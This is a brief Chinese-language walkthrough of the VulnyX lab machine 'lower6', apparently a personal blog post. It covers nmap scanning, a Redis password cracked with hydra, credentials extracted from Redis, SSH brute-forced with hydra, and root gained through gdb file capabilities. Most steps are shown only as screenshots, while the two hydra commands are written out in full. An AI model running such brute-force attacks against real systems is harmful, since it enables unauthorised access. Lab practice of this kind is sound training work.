---
title: vulnyx lower6
date: 2025-12-25 18:27:21
tags: 靶场
---

nmap扫描靶场

![image-20251225182924007](../images/image-20251225182924007.png)

发现redis端口

![image-20251225183012951](../images/image-20251225183012951.png)

redis需要密码

hydra -P ./nmap.lst redis://192.168.56.117 -V -I -f

爆破得到密码

![image-20251225183212038](../images/image-20251225183212038.png)

连接拿到key

![image-20251225183259827](../images/image-20251225183259827.png)

批量提取用户名和密码

![image-20251225184145911](../images/image-20251225184145911.png)

然后爆破ssh

```
hydra -L user.txt -P passwd.txt ssh://192.168.56.117 -f -V -I
```

![image-20251225184242669](../images/image-20251225184242669.png)

![image-20251225184426605](../images/image-20251225184426605.png)

getcap提权

![image-20251225184559731](../images/image-20251225184559731.png)

查看gdb用法

![image-20251225184622399](../images/image-20251225184622399.png)

![image-20251225184918148](../images/image-20251225184918148.png)
